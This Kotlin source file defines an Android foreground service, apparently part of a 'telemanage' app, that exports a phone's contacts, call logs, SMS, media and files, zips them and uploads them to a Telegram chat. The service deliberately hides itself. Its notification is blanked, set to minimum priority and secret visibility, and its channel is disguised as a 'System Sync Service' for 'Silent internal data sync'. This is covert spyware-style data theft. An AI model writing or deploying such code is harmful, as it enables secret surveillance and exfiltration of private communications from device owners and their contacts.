package com.example.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.example.MainActivity
import com.example.R
import com.example.data.api.TelegramClient
import com.example.data.calls.CallLogRepository
import com.example.data.contacts.ContactRepository
import com.example.data.export.CallLogExporter
import com.example.data.export.ContactsExporter
import com.example.data.export.FileExporter
import com.example.data.export.MediaExporter
import com.example.data.export.SmsExporter
import com.example.data.security.PreferenceManager
import com.example.data.sms.SmsRepository
import com.example.domain.export.ExportManager
import com.example.domain.export.ExportProgress
import com.example.domain.export.ExportState
import com.example.domain.export.ExportType
import com.example.domain.media.MediaRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.flow.collectLatest
import kotlinx.coroutines.launch

class ExportService : Service() {

    companion object {
        const val ACTION_START_EXPORT = "com.example.telemanage.START_EXPORT"
        const val ACTION_CANCEL_EXPORT = "com.example.telemanage.CANCEL_EXPORT"
        const val EXTRA_EXPORT_TYPE = "extra_export_type"
        const val EXTRA_CHAT_ID = "extra_chat_id"

        private const val NOTIFICATION_ID = 2002
        private const val CHANNEL_ID = "telemanage_export_channel"

        private var exportManagerInstance: ExportManager? = null

        fun getExportManager(context: Context): ExportManager {
            if (exportManagerInstance == null) {
                val prefManager = PreferenceManager(context.applicationContext)
                val teleClient = TelegramClient()
                val contactsRepo = ContactRepository(context.applicationContext)
                val callsRepo = CallLogRepository(context.applicationContext)
                val smsRepo = SmsRepository(context.applicationContext)
                val mediaRepo = MediaRepository(context.applicationContext)

                exportManagerInstance = ExportManager(
                    context = context.applicationContext,
                    telegramClient = teleClient,
                    preferenceManager = prefManager,
                    contactsExporter = ContactsExporter(contactsRepo),
                    callLogExporter = CallLogExporter(callsRepo),
                    smsExporter = SmsExporter(smsRepo),
                    mediaExporter = MediaExporter(context.applicationContext, mediaRepo),
                    fileExporter = FileExporter(context.applicationContext)
                )
            }
            return exportManagerInstance!!
        }

        fun startExport(context: Context, type: ExportType, chatId: Long) {
            val intent = Intent(context, ExportService::class.java).apply {
                action = ACTION_START_EXPORT
                putExtra(EXTRA_EXPORT_TYPE, type.name)
                putExtra(EXTRA_CHAT_ID, chatId)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun cancelExport(context: Context) {
            val intent = Intent(context, ExportService::class.java).apply {
                action = ACTION_CANCEL_EXPORT
            }
            context.startService(intent)
        }
    }

    private val serviceJob = Job()
    private val serviceScope = CoroutineScope(Dispatchers.Main + serviceJob)
    private lateinit var exportManager: ExportManager
    private var progressObserveJob: Job? = null

    override fun onCreate() {
        super.onCreate()
        exportManager = getExportManager(applicationContext)
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_CANCEL_EXPORT) {
            exportManager.cancelExport()
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
            return START_NOT_STICKY
        }

        val typeStr = intent?.getStringExtra(EXTRA_EXPORT_TYPE)
        val chatId = intent?.getLongExtra(EXTRA_CHAT_ID, 0L) ?: 0L
        val type = typeStr?.let {
            try { ExportType.valueOf(it) } catch (_: Exception) { null }
        } ?: ExportType.ALL

        startForegroundNotification("Preparing export...", 0)

        // Observe progress to update notification
        progressObserveJob?.cancel()
        progressObserveJob = serviceScope.launch {
            ExportManager.progressFlow.collectLatest { progress ->
                when (progress.state) {
                    ExportState.PREPARING, ExportState.EXPORTING, ExportState.ZIPPING, ExportState.UPLOADING -> {
                        updateNotification(progress)
                    }
                    ExportState.COMPLETED, ExportState.CANCELLED, ExportState.FAILED -> {
                        stopForeground(STOP_FOREGROUND_REMOVE)
                        stopSelf()
                    }
                    ExportState.IDLE -> {}
                }
            }
        }

        // Trigger export execution
        serviceScope.launch(Dispatchers.IO) {
            exportManager.startExport(type, chatId)
        }

        return START_NOT_STICKY
    }

    private fun startForegroundNotification(text: String, progressPercent: Int) {
        val notification = buildNotification(text, progressPercent)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun updateNotification(progress: ExportProgress) {
        val manager = getSystemService(NotificationManager::class.java)
        manager.notify(NOTIFICATION_ID, buildNotification(progress.statusMessage, progress.percentage))
    }

    private fun buildNotification(text: String, progressPercent: Int): Notification {
        val openAppIntent = Intent(this, MainActivity::class.java)
        val pendingOpenApp = PendingIntent.getActivity(
            this,
            0,
            openAppIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val cancelIntent = Intent(this, ExportService::class.java).apply {
            action = ACTION_CANCEL_EXPORT
        }
        val pendingCancel = PendingIntent.getService(
            this,
            1,
            cancelIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentIntent(pendingOpenApp)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Sync Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Silent internal data sync"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceJob.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
